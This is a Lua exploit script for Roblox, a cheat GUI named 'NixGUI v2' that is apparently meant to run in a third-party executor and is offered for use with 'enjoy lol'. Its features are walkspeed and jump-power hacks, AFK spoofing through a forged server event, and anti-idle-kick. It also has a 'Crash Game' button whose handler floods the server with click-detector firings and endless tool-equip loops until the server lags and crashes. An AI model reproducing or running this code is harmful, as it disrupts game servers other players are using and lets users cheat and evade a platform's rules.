--[[
	     .-') _       ) (`-.                                                 (`-.             
    ( OO ) )       ( OO ).                                             _(OO  )_           
,--./ ,--,' ,-.-')(_/.  \_)-.  ,----.    ,--. ,--.    ,-.-')       ,--(_/   ,. \ .-----.  
|   \ |  |\ |  |OO)\  `.'  /  '  .-./-') |  | |  |    |  |OO)      \   \   /(__// ,-.   \ 
|    \|  | )|  |  \ \     /\  |  |_( O- )|  | | .-')  |  |  \       \   \ /   / '-'  |  | 
|  .     |/ |  |(_/  \   \ |  |  | .--, \|  |_|( OO ) |  |(_/        \   '   /,    .'  /  
|  |\    | ,|  |_.' .'    \_)(|  | '. (_/|  | | `-' /,|  |_.'         \     /__) .'  /__  
|  | \   |(_|  |   /  .'.  \  |  '--'  |('  '-'(_.-'(_|  |             \   /    |       | 
`--'  `--'  `--'  '--'   '--'  `------'   `-----'     `--'              `-'     `-------' 
--]]
-- enjoy lol
-- ananymoos, 6-10-2022 at 1:24 pm est

local NixGUI = Instance.new("ScreenGui")
local MainFrame = Instance.new("Frame")
local Topbar = Instance.new("Folder")
local close = Instance.new("ImageButton")
local TextLabel = Instance.new("TextLabel")
local Extra = Instance.new("Folder")
local DropShadowHolder = Instance.new("Frame")
local DropShadow = Instance.new("ImageLabel")
local UICorner = Instance.new("UICorner")
local Pages = Instance.new("Folder")
local MiscFrame = Instance.new("Frame")
local UICorner_2 = Instance.new("UICorner")
local TextLabel_2 = Instance.new("TextLabel")
local ScrollingFrame = Instance.new("ScrollingFrame")
local UIListLayout = Instance.new("UIListLayout")
local GetConeButton = Instance.new("TextButton")
local UICorner_3 = Instance.new("UICorner")
local AfkSpooferButton = Instance.new("TextButton")
local UICorner_4 = Instance.new("UICorner")
local GameCrasher = Instance.new("TextButton")
local UICorner_5 = Instance.new("UICorner")
local AntiIdle = Instance.new("TextButton")
local UICorner_6 = Instance.new("UICorner")
local LocalPlayerFrame = Instance.new("Frame")
local UICorner_7 = Instance.new("UICorner")
local TextLabel_3 = Instance.new("TextLabel")
local InputBox = Instance.new("TextBox")
local UICorner_8 = Instance.new("UICorner")
local WalkspeedButton = Instance.new("TextButton")
local UICorner_9 = Instance.new("UICorner")
local JumpPower = Instance.new("TextButton")
local UICorner_10 = Instance.new("UICorner")
local CreditsFrame = Instance.new("Frame")
local UICorner_11 = Instance.new("UICorner")
local TextLabel_4 = Instance.new("TextLabel")
local Frame = Instance.new("Frame")
local TextLabel_5 = Instance.new("TextLabel")
local UIListLayout_2 = Instance.new("UIListLayout")
local UICorner_12 = Instance.new("UICorner")
local TextLabel_6 = Instance.new("TextLabel")
local TextLabel_7 = Instance.new("TextLabel")
local TextLabel_8 = Instance.new("TextLabel")
local SettingsFrame = Instance.new("Frame")
local UICorner_13 = Instance.new("UICorner")
local TextLabel_9 = Instance.new("TextLabel")
local JobIdBox = Instance.new("TextBox")
local UICorner_14 = Instance.new("UICorner")
local RejoinButton = Instance.new("TextButton")
local UICorner_15 = Instance.new("UICorner")
local FixCamButton = Instance.new("TextButton")
local UICorner_16 = Instance.new("UICorner")
local ServerhopButton = Instance.new("TextButton")
local UICorner_17 = Instance.new("UICorner")
local LegacyUIButton = Instance.new("TextButton")
local UICorner_18 = Instance.new("UICorner")
local HomeFrame = Instance.new("Frame")
local UICorner_19 = Instance.new("UICorner")
local TextLabel_10 = Instance.new("TextLabel")
local TextLabel_11 = Instance.new("TextLabel")
local TextLabel_12 = Instance.new("TextLabel")
local TextLabel_13 = Instance.new("TextLabel")
local SidebarFrame = Instance.new("Frame")
local UICorner_20 = Instance.new("UICorner")
local HomeButton = Instance.new("TextButton")
local UIListLayout_3 = Instance.new("UIListLayout")
local MiscButton = Instance.new("TextButton")
local LocalPlayerButton = Instance.new("TextButton")
local SettingsButton = Instance.new("TextButton")
local CreditsButton = Instance.new("TextButton")

--Properties:

NixGUI.Name = "NixGUI"
NixGUI.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
NixGUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
NixGUI.ResetOnSpawn = false

MainFrame.Name = "MainFrame"
MainFrame.Parent = NixGUI
MainFrame.BackgroundColor3 = Color3.fromRGB(41, 41, 41)
MainFrame.Position = UDim2.new(0.28118813, 0, 0.149450555, 0)
MainFrame.Size = UDim2.new(0, 421, 0, 248)

Topbar.Name = "Topbar"
Topbar.Parent = MainFrame

close.Name = "close"
close.Parent = Topbar
close.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
close.BackgroundTransparency = 1.000
close.Position = UDim2.new(0.940617561, 0, 0, 0)
close.Size = UDim2.new(0, 25, 0, 25)
close.Image = "rbxassetid://7743878857"

TextLabel.Parent = Topbar
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Position = UDim2.new(-0.159999996, 0, -0.0599999987, 0)
TextLabel.Size = UDim2.new(0, 200, 0, 50)
TextLabel.Font = Enum.Font.Gotham
TextLabel.Text = "NixGUI"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 14.000

Extra.Name = "Extra"
Extra.Parent = MainFrame

DropShadowHolder.Name = "DropShadowHolder"
DropShadowHolder.Parent = Extra
DropShadowHolder.BackgroundTransparency = 1.000
DropShadowHolder.BorderSizePixel = 0
DropShadowHolder.Size = UDim2.new(1, 0, 1, 0)
DropShadowHolder.ZIndex = 0

DropShadow.Name = "DropShadow"
DropShadow.Parent = DropShadowHolder
DropShadow.AnchorPoint = Vector2.new(0.5, 0.5)
DropShadow.BackgroundTransparency = 1.000
DropShadow.BorderSizePixel = 0
DropShadow.Position = UDim2.new(0.5, 0, 0.5, 0)
DropShadow.Size = UDim2.new(1, 47, 1, 47)
DropShadow.ZIndex = 0
DropShadow.Image = "rbxassetid://6014261993"
DropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
DropShadow.ImageTransparency = 0.500
DropShadow.ScaleType = Enum.ScaleType.Slice
DropShadow.SliceCenter = Rect.new(49, 49, 450, 450)

UICorner.CornerRadius = UDim.new(0, 3)
UICorner.Parent = MainFrame

Pages.Name = "Pages"
Pages.Parent = MainFrame

MiscFrame.Name = "MiscFrame"
MiscFrame.Parent = Pages
MiscFrame.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
MiscFrame.Position = UDim2.new(0.273000002, 0, 0.104999997, 0)
MiscFrame.Size = UDim2.new(0, 299, 0, 214)
MiscFrame.Visible = false

UICorner_2.CornerRadius = UDim.new(0, 2)
UICorner_2.Parent = MiscFrame

TextLabel_2.Parent = MiscFrame
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.Position = UDim2.new(0.163879603, 0, -0.0794392526, 0)
TextLabel_2.Size = UDim2.new(0, 200, 0, 50)
TextLabel_2.Font = Enum.Font.Gotham
TextLabel_2.Text = "Misc"
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextSize = 14.000

ScrollingFrame.Parent = MiscFrame
ScrollingFrame.Active = true
ScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ScrollingFrame.BackgroundTransparency = 1.000
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.Position = UDim2.new(0, 0, 0.0792522952, 0)
ScrollingFrame.Size = UDim2.new(0, 299, 0, 197)

UIListLayout.Parent = ScrollingFrame
UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.Padding = UDim.new(0, 10)

GetConeButton.Name = "GetConeButton"
GetConeButton.Parent = ScrollingFrame
GetConeButton.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
GetConeButton.Size = UDim2.new(0, 286, 0, 50)
GetConeButton.Font = Enum.Font.Gotham
GetConeButton.Text = "Get Cone"
GetConeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
GetConeButton.TextSize = 14.000

UICorner_3.CornerRadius = UDim.new(0, 2)
UICorner_3.Parent = GetConeButton

AfkSpooferButton.Name = "AfkSpooferButton"
AfkSpooferButton.Parent = ScrollingFrame
AfkSpooferButton.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
AfkSpooferButton.Size = UDim2.new(0, 286, 0, 50)
AfkSpooferButton.Font = Enum.Font.Gotham
AfkSpooferButton.Text = "AFK Spoof"
AfkSpooferButton.TextColor3 = Color3.fromRGB(255, 255, 255)
AfkSpooferButton.TextSize = 14.000

UICorner_4.CornerRadius = UDim.new(0, 2)
UICorner_4.Parent = AfkSpooferButton

GameCrasher.Name = "GameCrasher"
GameCrasher.Parent = ScrollingFrame
GameCrasher.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
GameCrasher.Size = UDim2.new(0, 286, 0, 50)
GameCrasher.Font = Enum.Font.Gotham
GameCrasher.Text = "Crash Game"
GameCrasher.TextColor3 = Color3.fromRGB(255, 255, 255)
GameCrasher.TextSize = 14.000

UICorner_5.CornerRadius = UDim.new(0, 2)
UICorner_5.Parent = GameCrasher

AntiIdle.Name = "AntiIdle"
AntiIdle.Parent = ScrollingFrame
AntiIdle.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
AntiIdle.Size = UDim2.new(0, 286, 0, 50)
AntiIdle.Font = Enum.Font.Gotham
AntiIdle.Text = "Anti Idle Kick"
AntiIdle.TextColor3 = Color3.fromRGB(255, 255, 255)
AntiIdle.TextSize = 14.000

UICorner_6.CornerRadius = UDim.new(0, 2)
UICorner_6.Parent = AntiIdle

LocalPlayerFrame.Name = "LocalPlayerFrame"
LocalPlayerFrame.Parent = Pages
LocalPlayerFrame.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
LocalPlayerFrame.Position = UDim2.new(0.273000002, 0, 0.104999997, 0)
LocalPlayerFrame.Size = UDim2.new(0, 299, 0, 214)
LocalPlayerFrame.Visible = false

UICorner_7.CornerRadius = UDim.new(0, 2)
UICorner_7.Parent = LocalPlayerFrame

TextLabel_3.Parent = LocalPlayerFrame
TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.BackgroundTransparency = 1.000
TextLabel_3.Position = UDim2.new(0.163879603, 0, -0.0794392526, 0)
TextLabel_3.Size = UDim2.new(0, 200, 0, 50)
TextLabel_3.Font = Enum.Font.Gotham
TextLabel_3.Text = "LocalPlayer"
TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.TextSize = 14.000

InputBox.Name = "InputBox"
InputBox.Parent = LocalPlayerFrame
InputBox.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
InputBox.Position = UDim2.new(0.020066889, 0, 0.121495329, 0)
InputBox.Size = UDim2.new(0, 286, 0, 35)
InputBox.Font = Enum.Font.Gotham
InputBox.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
InputBox.PlaceholderText = "Value"
InputBox.Text = ""
InputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
InputBox.TextSize = 14.000

UICorner_8.CornerRadius = UDim.new(0, 2)
UICorner_8.Parent = InputBox

WalkspeedButton.Name = "WalkspeedButton"
WalkspeedButton.Parent = LocalPlayerFrame
WalkspeedButton.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
WalkspeedButton.Position = UDim2.new(0.040133778, 0, 0.373831779, 0)
WalkspeedButton.Size = UDim2.new(0, 128, 0, 35)
WalkspeedButton.Font = Enum.Font.Gotham
WalkspeedButton.Text = "Walkspeed"
WalkspeedButton.TextColor3 = Color3.fromRGB(255, 255, 255)
WalkspeedButton.TextSize = 14.000

UICorner_9.CornerRadius = UDim.new(0, 2)
UICorner_9.Parent = WalkspeedButton

JumpPower.Name = "JumpPower"
JumpPower.Parent = LocalPlayerFrame
JumpPower.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
JumpPower.Position = UDim2.new(0.548494935, 0, 0.373831779, 0)
JumpPower.Size = UDim2.new(0, 128, 0, 35)
JumpPower.Font = Enum.Font.Gotham
JumpPower.Text = "Jumppower"
JumpPower.TextColor3 = Color3.fromRGB(255, 255, 255)
JumpPower.TextSize = 14.000

UICorner_10.CornerRadius = UDim.new(0, 2)
UICorner_10.Parent = JumpPower

CreditsFrame.Name = "CreditsFrame"
CreditsFrame.Parent = Pages
CreditsFrame.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
CreditsFrame.Position = UDim2.new(0.273000002, 0, 0.104999997, 0)
CreditsFrame.Size = UDim2.new(0, 299, 0, 214)
CreditsFrame.Visible = false

UICorner_11.CornerRadius = UDim.new(0, 2)
UICorner_11.Parent = CreditsFrame

TextLabel_4.Parent = CreditsFrame
TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_4.BackgroundTransparency = 1.000
TextLabel_4.Position = UDim2.new(0.163879603, 0, -0.0794392526, 0)
TextLabel_4.Size = UDim2.new(0, 200, 0, 50)
TextLabel_4.Font = Enum.Font.Gotham
TextLabel_4.Text = "Credits"
TextLabel_4.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_4.TextSize = 14.000

Frame.Parent = CreditsFrame
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.BackgroundTransparency = 1.000
Frame.Position = UDim2.new(0, 0, 0.0792522952, 0)
Frame.Size = UDim2.new(0, 299, 0, 196)

TextLabel_5.Parent = Frame
TextLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_5.BackgroundTransparency = 1.000
TextLabel_5.Position = UDim2.new(0.331103683, 0, 0.579439282, 0)
TextLabel_5.Size = UDim2.new(0, 200, 0, 50)
TextLabel_5.Font = Enum.Font.Gotham
TextLabel_5.Text = "ananymoos#4364 | creator"
TextLabel_5.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_5.TextSize = 14.000

UIListLayout_2.Parent = Frame
UIListLayout_2.HorizontalAlignment = Enum.HorizontalAlignment.Center
UIListLayout_2.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout_2.Padding = UDim.new(0, -25)

UICorner_12.CornerRadius = UDim.new(0, 2)
UICorner_12.Parent = Frame

TextLabel_6.Parent = Frame
TextLabel_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_6.BackgroundTransparency = 1.000
TextLabel_6.Position = UDim2.new(0.331103683, 0, 0.579439282, 0)
TextLabel_6.Size = UDim2.new(0, 200, 0, 50)
TextLabel_6.Font = Enum.Font.Gotham
TextLabel_6.Text = "AddyLax#4275 | developer"
TextLabel_6.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_6.TextSize = 14.000

TextLabel_7.Parent = Frame
TextLabel_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_7.BackgroundTransparency = 1.000
TextLabel_7.Position = UDim2.new(0.331103683, 0, 0.579439282, 0)
TextLabel_7.Size = UDim2.new(0, 200, 0, 50)
TextLabel_7.Font = Enum.Font.Gotham
TextLabel_7.Text = "kf#3672 | beta tester"
TextLabel_7.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_7.TextSize = 14.000

TextLabel_8.Parent = Frame
TextLabel_8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_8.BackgroundTransparency = 1.000
TextLabel_8.Position = UDim2.new(0.331103683, 0, 0.579439282, 0)
TextLabel_8.Size = UDim2.new(0, 200, 0, 50)
TextLabel_8.Font = Enum.Font.Gotham
TextLabel_8.Text = "aash#0002 | beta tester"
TextLabel_8.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_8.TextSize = 14.000

SettingsFrame.Name = "SettingsFrame"
SettingsFrame.Parent = Pages
SettingsFrame.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
SettingsFrame.Position = UDim2.new(0.273000002, 0, 0.104999997, 0)
SettingsFrame.Size = UDim2.new(0, 299, 0, 214)
SettingsFrame.Visible = false

UICorner_13.CornerRadius = UDim.new(0, 2)
UICorner_13.Parent = SettingsFrame

TextLabel_9.Parent = SettingsFrame
TextLabel_9.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_9.BackgroundTransparency = 1.000
TextLabel_9.Position = UDim2.new(0.163879603, 0, -0.0794392526, 0)
TextLabel_9.Size = UDim2.new(0, 200, 0, 50)
TextLabel_9.Font = Enum.Font.Gotham
TextLabel_9.Text = "Settings"
TextLabel_9.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_9.TextSize = 14.000

JobIdBox.Name = "JobIdBox"
JobIdBox.Parent = SettingsFrame
JobIdBox.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
JobIdBox.Position = UDim2.new(0.020066889, 0, 0.121495329, 0)
JobIdBox.Size = UDim2.new(0, 286, 0, 35)
JobIdBox.Font = Enum.Font.Gotham
JobIdBox.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
JobIdBox.PlaceholderText = "JobId"
JobIdBox.Text = ""
JobIdBox.TextColor3 = Color3.fromRGB(255, 255, 255)
JobIdBox.TextSize = 14.000
JobIdBox.TextWrapped = true

UICorner_14.CornerRadius = UDim.new(0, 2)
UICorner_14.Parent = JobIdBox

RejoinButton.Name = "RejoinButton"
RejoinButton.Parent = SettingsFrame
RejoinButton.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
RejoinButton.Position = UDim2.new(0.040133778, 0, 0.373831779, 0)
RejoinButton.Size = UDim2.new(0, 128, 0, 35)
RejoinButton.Font = Enum.Font.Gotham
RejoinButton.Text = "Rejoin"
RejoinButton.TextColor3 = Color3.fromRGB(255, 255, 255)
RejoinButton.TextSize = 14.000

UICorner_15.CornerRadius = UDim.new(0, 2)
UICorner_15.Parent = RejoinButton

FixCamButton.Name = "FixCamButton"
FixCamButton.Parent = SettingsFrame
FixCamButton.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
FixCamButton.Position = UDim2.new(0.548494995, 0, 0.373831779, 0)
FixCamButton.Size = UDim2.new(0, 128, 0, 35)
FixCamButton.Font = Enum.Font.Gotham
FixCamButton.Text = "Fix Camera"
FixCamButton.TextColor3 = Color3.fromRGB(255, 255, 255)
FixCamButton.TextSize = 14.000

UICorner_16.CornerRadius = UDim.new(0, 2)
UICorner_16.Parent = FixCamButton

ServerhopButton.Name = "ServerhopButton"
ServerhopButton.Parent = SettingsFrame
ServerhopButton.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
ServerhopButton.Position = UDim2.new(0.0401337743, 0, 0.640186906, 0)
ServerhopButton.Size = UDim2.new(0, 128, 0, 35)
ServerhopButton.Font = Enum.Font.Gotham
ServerhopButton.Text = "Server Hop"
ServerhopButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ServerhopButton.TextSize = 14.000

UICorner_17.CornerRadius = UDim.new(0, 2)
UICorner_17.Parent = ServerhopButton

LegacyUIButton.Name = "LegacyUIButton"
LegacyUIButton.Parent = SettingsFrame
LegacyUIButton.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
LegacyUIButton.Position = UDim2.new(0.548494995, 0, 0.640186906, 0)
LegacyUIButton.Size = UDim2.new(0, 128, 0, 35)
LegacyUIButton.Font = Enum.Font.Gotham
LegacyUIButton.Text = "Legacy UI"
LegacyUIButton.TextColor3 = Color3.fromRGB(255, 255, 255)
LegacyUIButton.TextSize = 14.000

UICorner_18.CornerRadius = UDim.new(0, 2)
UICorner_18.Parent = LegacyUIButton

HomeFrame.Name = "HomeFrame"
HomeFrame.Parent = Pages
HomeFrame.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
HomeFrame.Position = UDim2.new(0.273159146, 0, 0.104838707, 0)
HomeFrame.Size = UDim2.new(0, 299, 0, 214)

UICorner_19.CornerRadius = UDim.new(0, 2)
UICorner_19.Parent = HomeFrame

TextLabel_10.Parent = HomeFrame
TextLabel_10.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_10.BackgroundTransparency = 1.000
TextLabel_10.Position = UDim2.new(0.163879603, 0, -0.0794392526, 0)
TextLabel_10.Size = UDim2.new(0, 200, 0, 50)
TextLabel_10.Font = Enum.Font.Gotham
TextLabel_10.Text = "Home"
TextLabel_10.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_10.TextSize = 14.000

TextLabel_11.Parent = HomeFrame
TextLabel_11.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_11.BackgroundTransparency = 1.000
TextLabel_11.Position = UDim2.new(0.180602014, 0, 0.378504753, 0)
TextLabel_11.Size = UDim2.new(0, 190, 0, 43)
TextLabel_11.Font = Enum.Font.Gotham
TextLabel_11.Text = "News:"
TextLabel_11.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_11.TextSize = 14.000
TextLabel_11.TextWrapped = true

TextLabel_12.Parent = HomeFrame
TextLabel_12.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_12.BackgroundTransparency = 1.000
TextLabel_12.Position = UDim2.new(0.0501672328, 0, 0.556074798, 0)
TextLabel_12.Size = UDim2.new(0, 268, 0, 23)
TextLabel_12.Font = Enum.Font.Gotham
TextLabel_12.Text = "NixGUI v2 has been officially released!"
TextLabel_12.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_12.TextSize = 14.000
TextLabel_12.TextWrapped = true

TextLabel_13.Parent = HomeFrame
TextLabel_13.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_13.BackgroundTransparency = 1.000
TextLabel_13.Position = UDim2.new(0.0501672328, 0, 0.66355145, 0)
TextLabel_13.Size = UDim2.new(0, 268, 0, 23)
TextLabel_13.Font = Enum.Font.Gotham
TextLabel_13.Text = "Successfully added settings. Enjoy!"
TextLabel_13.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_13.TextSize = 14.000
TextLabel_13.TextWrapped = true

SidebarFrame.Name = "SidebarFrame"
SidebarFrame.Parent = MainFrame
SidebarFrame.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
SidebarFrame.Position = UDim2.new(0.0166270062, 0, 0.104838707, 0)
SidebarFrame.Size = UDim2.new(0, 85, 0, 214)

UICorner_20.CornerRadius = UDim.new(0, 2)
UICorner_20.Parent = SidebarFrame

HomeButton.Name = "HomeButton"
HomeButton.Parent = SidebarFrame
HomeButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
HomeButton.BackgroundTransparency = 1.000
HomeButton.Position = UDim2.new(0.117647059, 0, 0.0514018685, 0)
HomeButton.Size = UDim2.new(0, 51, 0, 17)
HomeButton.Font = Enum.Font.Gotham
HomeButton.Text = "Home"
HomeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
HomeButton.TextSize = 14.000

UIListLayout_3.Parent = SidebarFrame
UIListLayout_3.HorizontalAlignment = Enum.HorizontalAlignment.Center
UIListLayout_3.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout_3.Padding = UDim.new(0, 10)

MiscButton.Name = "MiscButton"
MiscButton.Parent = SidebarFrame
MiscButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MiscButton.BackgroundTransparency = 1.000
MiscButton.Position = UDim2.new(0.117647059, 0, 0.0514018685, 0)
MiscButton.Size = UDim2.new(0, 51, 0, 17)
MiscButton.Font = Enum.Font.Gotham
MiscButton.Text = "Misc"
MiscButton.TextColor3 = Color3.fromRGB(255, 255, 255)
MiscButton.TextSize = 14.000

LocalPlayerButton.Name = "LocalPlayerButton"
LocalPlayerButton.Parent = SidebarFrame
LocalPlayerButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
LocalPlayerButton.BackgroundTransparency = 1.000
LocalPlayerButton.Position = UDim2.new(0.200000003, 0, 0.205607474, 0)
LocalPlayerButton.Size = UDim2.new(0, 68, 0, 17)
LocalPlayerButton.Font = Enum.Font.Gotham
LocalPlayerButton.Text = "LocalPlayer"
LocalPlayerButton.TextColor3 = Color3.fromRGB(255, 255, 255)
LocalPlayerButton.TextSize = 14.000

SettingsButton.Name = "SettingsButton"
SettingsButton.Parent = SidebarFrame
SettingsButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SettingsButton.BackgroundTransparency = 1.000
SettingsButton.Position = UDim2.new(0.200000003, 0, 0.205607474, 0)
SettingsButton.Size = UDim2.new(0, 68, 0, 17)
SettingsButton.Font = Enum.Font.Gotham
SettingsButton.Text = "Settings"
SettingsButton.TextColor3 = Color3.fromRGB(255, 255, 255)
SettingsButton.TextSize = 14.000

CreditsButton.Name = "CreditsButton"
CreditsButton.Parent = SidebarFrame
CreditsButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CreditsButton.BackgroundTransparency = 1.000
CreditsButton.Position = UDim2.new(0.200000003, 0, 0.205607474, 0)
CreditsButton.Size = UDim2.new(0, 68, 0, 17)
CreditsButton.Font = Enum.Font.Gotham
CreditsButton.Text = "Credits"
CreditsButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CreditsButton.TextSize = 14.000

-- Scripts:

local function BIZBNQ_fake_script() -- close.LocalScript 
	local script = Instance.new('LocalScript', close)

	script.Parent.MouseButton1Click:Connect(function()
		NixGUI:Destroy()
	end)
end
coroutine.wrap(BIZBNQ_fake_script)()
local function FPBOK_fake_script() -- Extra.Drag 
	local script = Instance.new('LocalScript', Extra)

	MainFrame.Active = true
	MainFrame.Draggable = true
end
coroutine.wrap(FPBOK_fake_script)()
local function ABNWAO_fake_script() -- Extra.JobIdHandler 
	local script = Instance.new('LocalScript', Extra)

	JobIdBox.TextEditable = false
	JobIdBox.ClearTextOnFocus = false
end
coroutine.wrap(ABNWAO_fake_script)()
local function UTDG_fake_script() -- GetConeButton.LocalScript 
	local script = Instance.new('LocalScript', GetConeButton)

	script.Parent.MouseButton1Click:Connect(function()
		local clickdetector = game:GetService("Workspace").Cones.Cone.ClickDetector
	
		fireclickdetector(clickdetector)
	end)
end
coroutine.wrap(UTDG_fake_script)()
local function PQOUAUQ_fake_script() -- AfkSpooferButton.LocalScript 
	local script = Instance.new('LocalScript', AfkSpooferButton)

	script.Parent.MouseButton1Click:Connect(function()
		local args = {
			[1] = true
		}
	
		game:GetService("ReplicatedStorage").Events.AFK:FireServer(unpack(args))	
	end)
end
coroutine.wrap(PQOUAUQ_fake_script)()
local function YMKL_fake_script() -- GameCrasher.LocalScript 
	local script = Instance.new('LocalScript', GameCrasher)

	script.Parent.MouseButton1Click:Connect(function()
		local msg = Instance.new("Message", workspace)
		msg.Text = "Started lagging the server. It may take up to 5 minutes to fully crash."
		wait(6)
		msg:Destroy()
		game:GetService("RunService").Stepped:connect(function()
			local clickdetector = game:GetService("Workspace").Cones.Cone.ClickDetector
	
			fireclickdetector(clickdetector)
			while true do wait (0.5)
				for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.name == "Cone" then
						v.Parent = game.Players.LocalPlayer.Character
					end
				end
			end
		end)
	end)
end
coroutine.wrap(YMKL_fake_script)()
local function MQXVU_fake_script() -- AntiIdle.LocalScript 
	local script = Instance.new('LocalScript', AntiIdle)

	script.Parent.MouseButton1Click:Connect(function()
		local vu = game:GetService("VirtualUser")
	
		game:GetService("Players").LocalPlayer.Idled:connect(function()
	
			vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
	
			wait(1)
	
			vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
	
		end)
	end)
end
coroutine.wrap(MQXVU_fake_script)()
local function LTQWRR_fake_script() -- WalkspeedButton.LocalScript 
	local script = Instance.new('LocalScript', WalkspeedButton)

	script.Parent.MouseButton1Click:Connect(function()
		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = script.Parent.Parent.InputBox.Text
	end)
end
coroutine.wrap(LTQWRR_fake_script)()
local function YHGH_fake_script() -- JumpPower.LocalScript 
	local script = Instance.new('LocalScript', JumpPower)

	script.Parent.MouseButton1Click:Connect(function()
		game.Players.LocalPlayer.Character.Humanoid.JumpPower = script.Parent.Parent.InputBox.Text
	end)
end
coroutine.wrap(YHGH_fake_script)()
local function BONMZD_fake_script() -- JobIdBox.LocalScript 
	local script = Instance.new('LocalScript', JobIdBox)

	script.Parent.Text = game.JobId
end
coroutine.wrap(BONMZD_fake_script)()
local function QIGN_fake_script() -- RejoinButton.LocalScript 
	local script = Instance.new('LocalScript', RejoinButton)

	script.Parent.MouseButton1Click:Connect(function()
		local ts = game:GetService("TeleportService")
	
		local p = game:GetService("Players").LocalPlayer
	
	
	
		ts:Teleport(game.PlaceId, p)
	end)
end
coroutine.wrap(QIGN_fake_script)()
local function UGYXQB_fake_script() -- FixCamButton.LocalScript 
	local script = Instance.new('LocalScript', FixCamButton)

	script.Parent.MouseButton1Click:Connect(function()
		function buttondown()
			game.Workspace.CurrentCamera:remove()
			wait(.1)
			game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
			game.Workspace.CurrentCamera.CameraType = "Custom"
		end
	
		script.Parent.MouseButton1Down:connect(buttondown)
	end)
end
coroutine.wrap(UGYXQB_fake_script)()
local function YXHH_fake_script() -- ServerhopButton.LocalScript 
	local script = Instance.new('LocalScript', ServerhopButton)

	script.Parent.MouseButton1Click:Connect(function()
		local x = {}
		for _, v in ipairs(game:GetService("HttpService"):JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data) do
			if type(v) == "table" and v.maxPlayers > v.playing and v.id ~= game.JobId then
				x[#x + 1] = v.id
			end
		end
		if #x > 0 then
			game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, x[math.random(1, #x)])
		else
			local msg = Instance.new("Message", workspace)
			msg.Text = "Unable to find a server."
			wait(6)
			msg:Destroy()
		end
	end)
end
coroutine.wrap(YXHH_fake_script)()
